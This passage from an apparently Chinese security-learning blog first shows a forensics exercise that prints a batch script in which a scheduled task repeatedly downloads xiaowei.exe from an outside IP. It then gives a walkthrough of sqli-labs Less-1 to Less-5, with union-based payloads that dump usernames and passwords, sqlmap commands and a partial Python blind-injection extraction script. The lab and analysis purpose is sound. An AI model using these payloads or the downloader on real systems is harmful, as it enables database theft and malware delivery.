id="黑客使用了计划任务来定时执行某shell程序，提交此程序名字"><a href="#黑客使用了计划任务来定时执行某shell程序，提交此程序名字" class="headerlink" title="黑客使用了计划任务来定时执行某shell程序，提交此程序名字"></a>黑客使用了计划任务来定时执行某shell程序，提交此程序名字</h1><p>照实战中，攻击队或黑客为了权限维持，不会只放一个远控工具，一般会埋雷进行启动计划任务，根据上方思路排查到，计划任务程序中存在的计划</p><p><img src="/../image/image-20240823152957393.png" alt="image-20240823152957393"></p><p>  在每天的晚上23点07会进行下载xiaowei.exe文件，点进去查看执行的程序，可看到执行绝对路径</p><p><img src="/../image/image-20240823153028704.png" alt="image-20240823153028704"></p><p> 查看这个bat脚本，最后得到执行全过程，确认下载了xiaowei.exe文件到相关目录，最后每次开机自启xiaowei.exe文件上线</p><p><img src="/../image/image-20240823153129897.png" alt="image-20240823153129897"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:loop</span><br><span class="line"><span class="built_in">echo</span> Requesting download from <span class="number">185</span>.<span class="number">117</span>.<span class="number">118</span>.<span class="number">21</span>:<span class="number">1111</span>/xiaowei.exe...</span><br><span class="line"><span class="built_in">start</span> /b powershell -Command &quot;Invoke-WebRequest -Uri &#x27;httpL//<span class="number">185</span>.<span class="number">117</span>.<span class="number">118</span>.<span class="number">21</span>/xiaowei.exe&#x27;&quot;</span><br><span class="line">timeout /t <span class="number">300</span> /nobreak &gt;<span class="built_in">nul</span></span><br><span class="line">gotp loop</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2024/08/19/sqli-labs/"/>
      <url>/2024/08/19/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p>攻略：<a href="https://blog.csdn.net/dreamthe/article/details/123795302">https://blog.csdn.net/dreamthe/article/details/123795302</a></p><p>总结：<a href="https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501">https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501</a></p><p>主要是温故知新，所以有些比较简单的步骤就不提了</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>就是下好靶场文档，加入小皮</p><p><img src="/../image/image-20240819190957257.png" alt="image-20240819190957257"></p><p>创建数据库时可能会提示mysql_connect()太旧了，需要用mysqli或PDO，这里只要切换一下php的版本就行，我用的是5.3.29</p><p>直接往下划就可以看淡Basic Challenges了，我们从这里开始</p><p><img src="/../image/image-20240819191440985.png" alt="image-20240819191440985"></p><h2 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h2><h3 id="Less-1-Get-Error-based-single-quotes"><a href="#Less-1-Get-Error-based-single-quotes" class="headerlink" title="Less-1 Get-Error based - single-quotes"></a>Less-1 Get-Error based - single-quotes</h3><p>Get型，参数在地址栏就可以控制，单引号闭合，有了提示，我们先进行第一步，找注入点，也就是找一个参数可控的地方，如果连注入点都没有，那也就无法利用sql注入了</p><p><img src="/../image/image-20240819191956940.png" alt="image-20240819191956940"></p><p>提示：请传入id作为参数</p><p><img src="/../image/image-20240819192032806.png" alt="image-20240819192032806"></p><p>可以，有回显，测试下注入类型，输入带上一个单引号，字符型</p><p><img src="/../image/image-20240819194506650.png" alt="image-20240819194506650"></p><p>判断闭合方式，题目提示了single quote</p><p><img src="/../image/image-20240819195549055.png" alt="image-20240819195549055"></p><p>下面就是判断字段数了，用order by即可，这里是到3个字段</p><p><img src="/../image/image-20240819200057662.png" alt="image-20240819200057662"></p><p>判断回显位置，这里要注意把id改成-1，这样查回来没有回显，就会显示我们用union查询的内容</p><p><img src="/../image/image-20240819200202321.png" alt="image-20240819200202321"></p><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 union select 1,2,3 from users;</span><br><span class="line">select * from users where id=-1 union select 1,2,3 from users;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819200816927.png" alt="image-20240819200816927"></p><p>可以看到如果不做一个空的查询，原来的数据还是会被查出来，好了，现在有了回显位置，可以查具体的内容了</p><p>先查库：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,database(),version()--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819201029271.png" alt="image-20240819201029271"></p><p>有了库名，我们可以来查表名了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,table_name from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819201239410.png" alt="image-20240819201239410"></p><p>可以看到，这样查的话，我们的表名是不全的，没有我们想要的，所以我们需要用到group_concat函数，可以拼接查询结果<a href="https://blog.csdn.net/wenxuankeji/article/details/136046922">https://blog.csdn.net/wenxuankeji/article/details/136046922</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819201514709.png" alt="image-20240819201514709"></p><p>这样子就可以看到查询的所有表了，在不限制回显长度的情况下，下面来查字段名,一样的套路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819201721838.png" alt="image-20240819201721838"></p><p>有了字段名，我们就可以查具体内容了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,username,password from users--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819201924321.png" alt="image-20240819201924321"></p><p>那怎么才能把他们全显示出来呢，同样可以用group_concat函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819202046100.png" alt="image-20240819202046100"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>当我们输入一个’号时，语句就变成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; --+&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>后面的limit的限制就没了，不然每次都只能看到第一条数据，无法多行显示</p><h3 id="Less-2-Intiger-based"><a href="#Less-2-Intiger-based" class="headerlink" title="Less-2 Intiger based"></a>Less-2 Intiger based</h3><p>数字型注入，和第一关的引号不同的是，不用引号了，也就不用判断闭合方式了，这里先看下源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里我们就不用单引号了，不然会报错，只要把后面的闭合即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; --+</span><br><span class="line">?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240819223624436.png" alt="image-20240819223624436"></p><h3 id="Less3-Single-quote-with-twist"><a href="#Less3-Single-quote-with-twist" class="headerlink" title="Less3 Single quote with twist"></a>Less3 Single quote with twist</h3><p>根据提示，这一题可能是两个引号，测试了下确实可以，但根据报错提示，我们的另一个闭合是括号</p><p><img src="/../image/image-20240820105654382.png" alt="image-20240820105654382"></p><p>看下源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>当我们输入’) –+时，语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=(&#x27;1&#x27;) -- &#x27;) limit0,1&quot;;</span><br></pre></td></tr></table></figure><p>所以我们最后的流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; --+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><h3 id="Less-4-Double-quote-with-twist"><a href="#Less-4-Double-quote-with-twist" class="headerlink" title="Less-4 Double quote with twist"></a>Less-4 Double quote with twist</h3><p>先看下源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>和less3的区别就是id用双引号包裹，所以我们只要将3的payload的单引号改成双引号即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; --+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><h3 id="Less-5-Double-Injection-Single-Quotes-String"><a href="#Less-5-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 Double Injection - Single Quotes - String"></a>Less-5 Double Injection - Single Quotes - String</h3><p>字符型，双重注入，单引号闭合</p><p><img src="/../image/image-20240820135143588.png" alt="image-20240820135143588"></p><p>可以看到当我们传入普通参数时，回显变了，测试下异常输入</p><p><img src="/../image/image-20240820135358102.png" alt="image-20240820135358102"></p><p>也是有报错回显的，但没有地方显示返回的字段，虽然有些页面可能会把返回字段放在html页面的注释了要看源代码才能发现，如Bluecms，这里我们传入一个-1试试</p><p><img src="/../image/image-20240820135543682.png" alt="image-20240820135543682"></p><p>可以发现You are in…没了，所以我们得用如布尔盲注的方式来注入，但仍需要判断闭合类型，这里是单引号闭合</p><p>布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。</p><p>首先来判断长度,比如我们的数据库是Security，8个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;9--+</span><br></pre></td></tr></table></figure><p>按照逻辑，这里应该是无回显的页面</p><p><img src="/../image/image-20240820142545147.png" alt="image-20240820142545147"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;7--+</span><br></pre></td></tr></table></figure><p>这里则应返回有回显的界面</p><p><img src="/../image/image-20240820142632276.png" alt="image-20240820142632276"></p><p>大于7小于9的整数就是8了，所以判断库名长度为8，然后就是一个一个爆库名了，比较费时间这个，等等用sqlmap和自己写代码来试一试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select database()),1,1))=115--+</span><br></pre></td></tr></table></figure><p>通过对返回的字符进行截取，然后判断ascii码来确定库名，从字符串中提取子字符串（从位置5开始，提取3个字符）:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820144035463.png" alt="image-20240820144035463"></p><p>再套上一个ascii函数试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select ascii(substr((select database()),1,1));</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820144453916.png" alt="image-20240820144453916"></p><p>根据这个来判断，如果要查第二个字符，就把substr函数里的第二个参数改成2即可，然后范围是1-8，而表则是把第一个参数换成之前查表的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select group_concat(table_name) from information_schema.tables where table_schema=databse()),1,1);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820150502432.png" alt="image-20240820150502432"></p><p>也就是之前查的那一串，逗号也会存在，所以需要注意转换，列名也就是换换,如查字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,1)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820151226687.png" alt="image-20240820151226687"></p><p>手动我就不测了，先用sqlmap试一下<a href="https://blog.csdn.net/qq_43621629/article/details/104526605">https://blog.csdn.net/qq_43621629/article/details/104526605</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.198/sql/Less-5/?id=1&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820154229669.png" alt="image-20240820154229669"></p><p>可以看到这里有三种方式，包括我们的布尔盲注，我们可以用–technique B来指定注入方式(不指定也行，默认顺序就是布尔先)，然后用-v参数控制输出内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.198/sql/Less-5/?id=1&quot; --dbs --batch --technique B -v 3 --这里-v 3也可以用vvv替代</span><br></pre></td></tr></table></figure><ol><li>只输出 Python 出错回溯信息，错误和关键信息。</li><li>增加输出普通信息和警告信息。</li><li>增加输出调试信息。</li><li>增加输出已注入的 payloads。</li><li>增加输出 HTTP 请求。</li><li>增加输出 HTTP 响应头</li><li>增加输岀 HTTP 响应内容。</li></ol><p><img src="/../image/image-20240820161925180.png" alt="image-20240820161925180"></p><p>可以看到sqlmap里用的是ord和mid的函数结合</p><p><img src="/../image/image-20240820162008024.png" alt="image-20240820162008024"></p><p>我们也可以自己写一个这种脚本，首先是访问网页，所以导入requests包，燃耗确定号url和True时返回的页面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.198/sql/Less-5/&quot;</span></span><br><span class="line"><span class="comment"># True的返回页面的特征</span></span><br><span class="line">valid_response = <span class="string">&quot;You are in&quot;</span></span><br></pre></td></tr></table></figure><p>根据请求类型(get&#x2F;post)，确定好payload的尝试方法，因为布尔盲注主要是利用ascii和substr来判断，获取数据的语句和之前union的还是一样的，所以先确认一个基本的模板</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;id&#x27; AND <span class="subst">&#123;payload&#125;</span> --&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=param)</span><br><span class="line"><span class="comment"># 抓包用</span></span><br><span class="line">    <span class="comment"># response = requests.get(url, params=param,proxies=proxies)</span></span><br><span class="line">    <span class="keyword">if</span> valid_response <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240820185950798.png" alt="image-20240820185950798"></p><p>抓包看了下，空格变成+号了，<a href="https://voidcat.cn/index.php/2020/06/06/python-requests-space/%EF%BC%8C%E5%8E%9F%E6%9D%A5%E7%9B%B4%E6%8E%A5%E4%BC%A0%E5%8F%82%E5%9B%9E%E5%8F%98%E6%88%90+%EF%BC%8C%E8%A6%81%E7%BC%96%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%BD%AC%E4%B9%89%E6%9C%89%E7%82%B9%E9%9A%BE%E6%90%9E%EF%BC%8C%E5%BC%84%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E8%AF%95%E8%AF%95">https://voidcat.cn/index.php/2020/06/06/python-requests-space/，原来直接传参回变成+，要编码一下，这个自动转义有点难搞，弄成字符串拼接试试</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">payload_test</span>(<span class="params">payload</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.174.198/sql/Less-5/&quot;</span></span><br><span class="line">    param1 = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;1&#x27; AND <span class="subst">&#123;payload&#125;</span> --+&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    param3 = <span class="string">f&quot;?id=1&#x27; and <span class="subst">&#123;payload&#125;</span> --+&quot;</span></span><br><span class="line">    <span class="comment">#param2 = urllib.parse.urlencode(param1, quote_via=urllib.parse.quote)</span></span><br><span class="line">    proxies = &#123;</span><br><span class="line">        <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = url + param3</span><br><span class="line">    <span class="built_in">print</span>(param1)</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="comment">#response = requests.get(url, proxies=proxies)</span></span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> valid_response <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>可以了</p><p><img src="/../image/image-20240820192759214.png" alt="image-20240820192759214"></p><p>下面就可以复制一下，把其它的长度求出来了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT group_concat(table_name) \</span></span><br><span class="line"><span class="string">        from information_schema.tables \</span></span><br><span class="line"><span class="string">        where table_schema = database()))=<span class="subst">&#123;length&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT group_concat(column_name) \</span></span><br><span class="line"><span class="string">                            from information_schema.columns \</span></span><br><span class="line"><span class="string">                            where table_schema = database()))=<span class="subst">&#123;length&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def get_dump_length():</span></span><br><span class="line"><span class="string">    for length in range(1,50):</span></span><br><span class="line"><span class="string">        payload=f&quot;LEGTH((SELECT group_concat(username, &#x27;~&#x27;, password) from users))=&#123;length&#125;&quot;</span></span><br><span class="line"><span class="string">        if payload_test(payload):</span></span><br><span class="line"><span class="string">            return length</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 具体内容等确定需求再具体实现</span></span><br></pre></td></tr></table></figure><p>按道理，这个长度以及后面的ascii判断用二分查找都会更快，且查字段要后续确认，这里为了方便就先这样写了。好像f“”的写法，遇到users时会有问题，好像也得改成拼接得方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT group_concat(column_name) \</span></span><br><span class="line"><span class="string">        from information_schema.columns \</span></span><br><span class="line"><span class="string">        where table_schema = database() and table_name=&#x27;user&#x27;))=<span class="subst">&#123;length&#125;</span>&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br></pre></td></tr></table></figure><p>最终成果</p><p><img src="/../image/image-20240820200259339.png" alt="image-20240820200259339"></p><p>下面就是具体内容的爆破了，我们先用python复习一下二分查找，因为我们这个判断的ascii自己就是有序的，且数量不多，我们可以跳过排序环节，直接上查找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Binary_search</span>(<span class="params">ls, target</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="built_in">len</span>(ls) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ls[mid] == target:</span><br><span class="line">             <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">if</span> ls[mid] &lt; target:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">ls = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="built_in">print</span>(Binary_search(ls, <span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>所以查ascii就是在字符中选择，这里我们可以看下菜鸟提供的ascii表</p><p><img src="https://www.runoob.com/wp-content/uploads/2022/03/ascii-1-1.png" alt="img"></p><p>我们这里挑出[0-10]、[a-zA-Z]、[_，~],就这三组的范围来看，对应的ascii码范围是[48-57]、[64-90|97-122]、[95,126]这样子来看，分段好像更麻烦，直接统一成[48-126]应该就行，把这个作为二分的有序列表，来查询，先写一个枚举的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sqli_exploit</span>():</span><br><span class="line">    database_length = get_database_length()</span><br><span class="line">    <span class="comment">#table_length = get_table_name_length()</span></span><br><span class="line">    column_length = get_column_name_length()</span><br><span class="line">    <span class="comment">#dump_length = get_dump_length()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;database length:&quot;</span>, database_length)</span><br><span class="line">    <span class="comment">#print(&quot;table length:&quot;, table_length)</span></span><br><span class="line">    <span class="comment">#print(&quot;column length:&quot;, column_length)</span></span><br><span class="line">    <span class="comment">#print(&quot;dummp length:&quot;, dump_length)</span></span><br><span class="line">    alphabet = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">127</span>)]  <span class="comment"># 可能的字符集合</span></span><br><span class="line">    extracted_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            payload = <span class="string">f&quot;ASCII(SUBSTR((SELECT database()),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (payload_test(payload)):</span><br><span class="line">                extracted_data += <span class="built_in">chr</span>(char)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;已完成字符:&quot;</span>, extracted_data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终结果:&quot;</span>, extracted_data)</span><br><span class="line"></span><br><span class="line">blind_sqli_exploit()</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821110400653.png" alt="image-20240821110400653"></p><p>感觉也还好，但这是在长度比较短的情况下，给他改成二分的形式，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sqli_exploit</span>():</span><br><span class="line">    database_length = get_database_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;database length:&quot;</span>, database_length)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        left = <span class="number">30</span></span><br><span class="line">        right = <span class="number">130</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            payload = <span class="string">f&quot;ASCII(SUBSTR((SELECT database()),<span class="subst">&#123;i&#125;</span>,1)) &gt; &#x27;<span class="subst">&#123;mid&#125;</span>&#x27;&quot;</span></span><br><span class="line">            payload2 = <span class="string">f&quot;ASCII(SUBSTR((SELECT database()),<span class="subst">&#123;i&#125;</span>,1)) = &#x27;<span class="subst">&#123;mid&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> payload_test(payload) == <span class="literal">True</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">if</span> payload_test(payload2) == <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终结果:&quot;</span>, extracted_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终结果:&quot;</span>, result)</span><br></pre></td></tr></table></figure><p>这是能跑正确的代码，如果不多加一个payload验证，他就会死循环，把条件改成left &lt; right有时候又会差个把两个字母不对，奇怪，感觉应该是下标的问题，上面二分的查找的条件是等于，这个是大于。</p><p><img src="/../image/image-20240821151856882.png" alt="image-20240821151856882"></p><p>以此类推，可以写出其它的代码，且字段数可能比较多，要把长度也改成用二分法判断。</p><p>先附上目前为止的完整代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.142/sql/Less-5/&quot;</span></span><br><span class="line"><span class="comment"># True的返回页面的特征</span></span><br><span class="line">valid_response = <span class="string">&quot;You are in&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_test</span>(<span class="params">payload</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.174.142/sql/Less-5/&quot;</span></span><br><span class="line">    param1 = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;1&#x27; AND <span class="subst">&#123;payload&#125;</span> --+&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    param3 = <span class="string">f&quot;?id=1&#x27; and <span class="subst">&#123;payload&#125;</span> --+&quot;</span></span><br><span class="line">    <span class="comment">#param2 = urllib.parse.urlencode(param1, quote_via=urllib.parse.quote)</span></span><br><span class="line">    proxies = &#123;</span><br><span class="line">        <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = url + param3</span><br><span class="line">    <span class="comment">#print(param1)</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="comment">#response = requests.get(url, proxies=proxies)</span></span><br><span class="line">    <span class="comment">#print(response.text)</span></span><br><span class="line">    <span class="keyword">if</span> valid_response <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">10</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT 